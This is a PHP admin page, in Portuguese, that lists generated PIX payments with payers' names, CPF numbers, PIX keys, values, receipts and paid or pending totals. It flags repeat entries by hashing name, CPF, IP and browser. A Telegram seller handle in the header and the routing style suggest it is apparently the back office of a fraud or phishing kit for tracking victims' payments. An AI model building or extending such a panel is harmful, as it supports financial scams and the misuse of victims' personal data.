<?php
   session_start();
   ini_set('display_errors', 1);
   ini_set('display_startup_errors', 1);
   error_reporting(E_ALL);
   
   require_once 'config.php';
   
   if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
       header("Location: ./");
       exit;
   }
   
   if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['tipo'], $_POST['id'])) {
       $tipo = $_POST['tipo'];
       $id = (int) $_POST['id'];
   
       if ($tipo === 'delpix') {
           $stmt = $conn->prepare("DELETE FROM infospix WHERE id = ?");
           $stmt->bind_param("i", $id);
   
           if ($stmt->execute()) {
               echo '
               <link href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css" rel="stylesheet"/>
               <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
               <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
               <script>
                   $(function() {
                       toastr.options.timeOut = 1500;
                       toastr.options.closeButton = true;
                       toastr.options.positionClass = "toast-top-right";
                       toastr.success("InfoPix deletado com sucesso!");
                       setTimeout(function() {
                           window.location.href = "?COMON=/ADMIN&acesso=InfosPix";
                       }, 1200);
                   });
               </script>';
           } else {
               echo "Erro ao excluir o InfoPix.";
           }
   
           $stmt->close();
       }
   }
   
   $sql = "SELECT id, nome, documento, chave_pix, gateway, status, pixid, valor, comprovante FROM infospix ORDER BY id DESC";
   
   $result = $conn->query($sql);
   $temResultados = ($result && $result->num_rows > 0);
   ?>
<!doctype html>
<html lang="pt-br" data-theme="dark">
   <?php include('head.php'); ?>
   <body data-theme="light">
      <div id="body" class="theme-cyan">
      <?php include('theme.php'); ?>
      <div class="overlay"></div>
      <div id="wrapper">
      <?php include('submenu.php'); ?>
      <?php include('menu.php'); ?>
      <div id="main-content">
      <div class="container-fluid">
      <div class="block-header">
         <div class="row clearfix">
            <div class="col-lg-4 col-md-12 col-sm-12">
               <h1>Olá  admin, você está em  / InfosPix</h1>
               <span>TXT_JPGI1 - @TXT_JPGI1 <== no telegram!</span>
            </div>
         </div>
      </div>
      <?php if (!$temResultados): ?>
      <script>
         $(function() {
             toastr.options.timeOut = 'false';
             toastr.options.closeButton = true;
         
             toastr.options.positionClass = 'toast-top-right';
             toastr['warning']('Voce ainda nao gerou pix!');
         
            
         });
      </script>	
      <?php endif; ?>
      <br>
      <?php require_once 'config.php'; $total=0;$valorTotal=0;$valorPago=0;$documentos=[];$repetidos=0;$sql="SELECT * FROM infospix";$result=$conn->query($sql);if($result&&$result->num_rows>0){$temResultados=true;$registrosUnicos=[];while($rowCalc=$result->fetch_assoc()){$total++;$valor=(float)$rowCalc['valor'];$valorTotal+=$valor;if(strtolower($rowCalc['status'])==='pago'){$valorPago+=$valor;}$documentos[]=$rowCalc['documento'];$chave=md5(strtolower(trim($rowCalc['documento'])).'|'.strtolower(trim($rowCalc['nome'])).'|'.strtolower(trim($rowCalc['ip'])).'|'.strtolower(trim($rowCalc['navegador'])).'|'.number_format($valor,2,'.',''));if(isset($registrosUnicos[$chave])){$repetidos++;}else{$registrosUnicos[$chave]=true;}}$valorPendente=$valorTotal-$valorPago;$unicos=count(array_unique($documentos));$result->data_seek(0);}else{$temResultados=false;$valorPendente=0;$unicos=0;}$conn->close(); ?>
      <div class="col-lg-12">
         <div class="card">
            <div class="card-header">
               <strong class="card-title">PIX gerados</strong>
            </div>
            <div class="div_contadores">
               <div class="contador_box">
                  <small>Total</small>
                  <span><?= $temResultados ? $total : 0 ?></span>
               </div>
               <!--<div class="contador_box">
                  <small>Únicos</small>
                  <span><?= $temResultados ? $unicos : 0 ?></span>
                  </div>-->
               <div class="contador_box">
                  <small>Repetidos</small>
                  <span><?= $temResultados ? $repetidos : 0 ?></span>
               </div>
               <div class="contador_box">
                  <small>Valor Total</small>
                  <span><?= $temResultados ? 'R$ ' . number_format($valorTotal, 2, ',', '.') : 'R$ 0,00' ?></span>
               </div>
               <div class="contador_box">
                  <small>Valor Pendente</small>
                  <span><?= $temResultados ? 'R$ ' . number_format($valorPendente, 2, ',', '.') : 'R$ 0,00' ?></span>
               </div>
               <div class="contador_box">
                  <small>Valor Pago</small>
                  <span><?= $temResultados ? 'R$ ' . number_format($valorPago, 2, ',', '.') : 'R$ 0,00' ?></span>
               </div>
            </div>
            <div class="card-body">
               <div class="table-responsive">
                  <table class="table mb-0">
                     <thead>
                        <tr>
                           <th>Nome</th>
                           <th>CPF</th>
                           <th>Chave Pix</th>
                           <th>Gateway</th>
                           <th>Comprovante</th>
                           <th>Ver Comprovante</th>
                           <th>Situação</th>
                           <th>Valor</th>
                           <th>Gerenciar</th>
                        </tr>
                     </thead>
                     <tbody>
                        <?php if ($temResultados): ?>
                        <?php while ($row = $result->fetch_assoc()): ?>
                        <tr>
                           <td><?= htmlspecialchars($row['nome']) ?></td>
                           <td><?= htmlspecialchars($row['documento']) ?></td>
                           <td><?= htmlspecialchars($row['chave_pix'] ?? '-') ?></td>
                           <td><?= !empty($row['gateway']) ? htmlspecialchars($row['gateway']) : '-' ?></td>
                           <td><?= !empty($row['comprovante']) ? 'Sim' : 'Não' ?></td>
                           <td><?php if (!empty($row['comprovante'])): ?><button type="button" class="btn-ver-comprovante btn btn-sm btn-default" data-toggle="modal" data-target="#comprovanteModal" data-comprovante="<?= htmlspecialchars($row['comprovante']) ?>" title="Ver comprovante"><i class="fa fa-eye" style="color:#DB6574;"></i></button><?php else: ?>-<?php endif; ?></td>
                           <td><?php if (strtolower($row['status']) === 'pago'): ?><span class="badge badge-success"><?= htmlspecialchars(strtolower($row['status'])) ?></span><?php else: ?><span class="badge badge-warning"><?= htmlspecialchars($row['status']) ?></span><?php endif; ?></td>
                           <td><?= 'R$ ' . number_format($row['valor'], 2, ',', '.') ?></td>
                           <td>
                              <button type="button" onclick="location.href='?COMON=/ADMIN&acesso=ViewPix&id=<?= (int)$row['id'] ?>';" class="btn btn-sm btn-default" title="Visualizar"><i class="fa fa-eye" style="font-size:15px; color:#DB6574;"></i></button>
                              <form method="post" class="d-inline"><input type="hidden" name="tipo" value="delpix"><input type="hidden" name="id" value="<?= (int)$row['id'] ?>"><button type="submit" class="btn btn-sm btn-default" title="Deletar"><i class="fa fa-trash"></i></button></form>
                           </td>
                        </tr>
                        <?php endwhile; ?><?php else: ?>
                        <tr>
                           <td colspan="9" class="text-center">Nenhum PIX Gerado</td>
                        </tr>
                        <?php endif; ?>
                     </tbody>
                  </table>
               </div>
            </div>
         </div>
      </div>
      <div class="modal fade" id="comprovanteModal" tabindex="-1" role="dialog" aria-labelledby="comprovanteModalLabel" aria-hidden="true">
         <div class="modal-dialog modal-dialog-centered" role="document">
            <div class="modal-content">
               <div class="modal-header">
                  <h5 class="modal-title" id="comprovanteModalLabel">Order <span id="pedidoNumero"></span></h5>
                  <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                  <span aria-hidden="true">&times;</span>
                  </button>
               </div>
               <div class="modal-body text-center">
                  <ul class="list-group list-group-flush mb-3">
                     <li class="list-group-item"><strong>Comprovante:</strong></li>
                  </ul>
                  <img id="imgComprovante" src="<?= htmlspecialchars($row['comprovante'] ?? '-') ?>" alt="Comprovante" style="max-width:100%;border-radius:8px;display:none;">
                  <p id="semComprovante" style="display:none;color:#999;">Erro Comprovante</p>
               </div>
               <div class="modal-footer">
                  <button type="button" class="btn btn-default" id="btnBaixarComprovante" data-dismiss="modal">Abaixar</button>
                  <button type="button" class="btn btn-default" data-dismiss="modal">Fechar</button>
               </div>
            </div>
         </div>
      </div>
      <script>
         document.getElementById('btnBaixarComprovante').addEventListener('click', function () {
         
             const img = document.getElementById('imgComprovante');
         
             if (!img.src || img.style.display === 'none') {
                 alert('Nenhum comprovante para baixar');
                 return;
             }
         
             window.location.href =
                 '?COMON=/ADMIN&acesso=baixar_comprovante&file=' + encodeURIComponent(img.src);
         });
      </script>
      <script>
         document.addEventListener('DOMContentLoaded', function () {
         
             document.querySelectorAll('.btn-ver-comprovante').forEach(function (btn) {
         
                 btn.addEventListener('click', function () {
         
                     const comprovante = this.getAttribute('data-comprovante');
                     const pedido = this.getAttribute('data-pedido');
         
                     const img = document.getElementById('imgComprovante');
                     const msg = document.getElementById('semComprovante');
                     const pedidoSpan = document.getElementById('pedidoNumero');
         
                     pedidoSpan.textContent = pedido ? pedido : '';
         
                     if (comprovante && comprovante.trim() !== '') {
                         img.src = comprovante;
                         img.style.display = 'block';
                         msg.style.display = 'none';
                     } else {
                         img.style.display = 'none';
                         msg.style.display = 'block';
                     }
         
                 });
         
             });
         
         });
      </script>